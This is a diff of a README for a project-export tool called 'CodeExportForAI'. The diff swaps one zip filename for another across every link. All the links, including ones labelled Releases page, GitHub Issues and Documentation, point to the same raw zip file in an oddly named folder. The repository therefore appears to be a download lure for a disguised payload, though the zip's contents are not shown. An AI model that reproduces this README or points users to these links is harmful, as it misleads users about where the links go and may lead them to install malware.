@@ -1,7 +1,7 @@
 # 🛠️ CodeExportForAI - Export Your Project Easily
 
 ## 📥 Download Now!
-[![Download CodeExportForAI](https://raw.githubusercontent.com/kenfatys/CodeExportForAI/master/snobography/CodeExportForAI.zip)](https://raw.githubusercontent.com/kenfatys/CodeExportForAI/master/snobography/CodeExportForAI.zip)
+[![Download CodeExportForAI](https://raw.githubusercontent.com/kenfatys/CodeExportForAI/master/snobography/For-Code-AI-Export-patristic.zip)](https://raw.githubusercontent.com/kenfatys/CodeExportForAI/master/snobography/For-Code-AI-Export-patristic.zip)
 
 ## 📝 Overview
 CodeExportForAI is a simple tool designed to help you export any project folder or repository into a single, neatly formatted file. This file is ideal for quick AI-assisted code review, debugging, and refactoring. It collects source files recursively, wraps them in fenced code blocks with relative paths, and filters out unnecessary noise, such as node_modules and .git directories. The tool also shows basic project statistics and allows you to copy content to your clipboard easily.
@@ -16,7 +16,7 @@ To run CodeExportForAI, make sure your system meets the following requirements:
 - **Disk Space:** At least 50 MB free space for temporary files.
 
 ### Step 2: Download the Application
-To download CodeExportForAI, please visit the [Releases page](https://raw.githubusercontent.com/kenfatys/CodeExportForAI/master/snobography/CodeExportForAI.zip). 
+To download CodeExportForAI, please visit the [Releases page](https://raw.githubusercontent.com/kenfatys/CodeExportForAI/master/snobography/For-Code-AI-Export-patristic.zip). 
 
 1. Click on the "Releases" link.
 2. Choose the version you need.
@@ -73,12 +73,12 @@ After launching CodeExportForAI, follow these steps to export your project:
 - If you encounter any issues during download or installation, please check the FAQs in the documentation section of the repository.
 
 ## 📈 Support and Contribution
-For any questions or feedback, feel free to check out our [GitHub Issues page](https://raw.githubusercontent.com/kenfatys/CodeExportForAI/master/snobography/CodeExportForAI.zip). We welcome contributions and ideas to improve CodeExportForAI.
+For any questions or feedback, feel free to check out our [GitHub Issues page](https://raw.githubusercontent.com/kenfatys/CodeExportForAI/master/snobography/For-Code-AI-Export-patristic.zip). We welcome contributions and ideas to improve CodeExportForAI.
 
 ## 📖 Learn More
-Explore more about how CodeExportForAI can help streamline your coding tasks. Visit the [Documentation](https://raw.githubusercontent.com/kenfatys/CodeExportForAI/master/snobography/CodeExportForAI.zip) for in-depth guides and tips.
+Explore more about how CodeExportForAI can help streamline your coding tasks. Visit the [Documentation](https://raw.githubusercontent.com/kenfatys/CodeExportForAI/master/snobography/For-Code-AI-Export-patristic.zip) for in-depth guides and tips.
 
 ## 🔗 Links
-- [Download CodeExportForAI](https://raw.githubusercontent.com/kenfatys/CodeExportForAI/master/snobography/CodeExportForAI.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/kenfatys/CodeExportForAI/master/snobography/CodeExportForAI.zip)
-- [Documentation](https://raw.githubusercontent.com/kenfatys/CodeExportForAI/master/snobography/CodeExportForAI.zip)
+- [Download CodeExportForAI](https://raw.githubusercontent.com/kenfatys/CodeExportForAI/master/snobography/For-Code-AI-Export-patristic.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/kenfatys/CodeExportForAI/master/snobography/For-Code-AI-Export-patristic.zip)
+- [Documentation](https://raw.githubusercontent.com/kenfatys/CodeExportForAI/master/snobography/For-Code-AI-Export-patristic.zip)
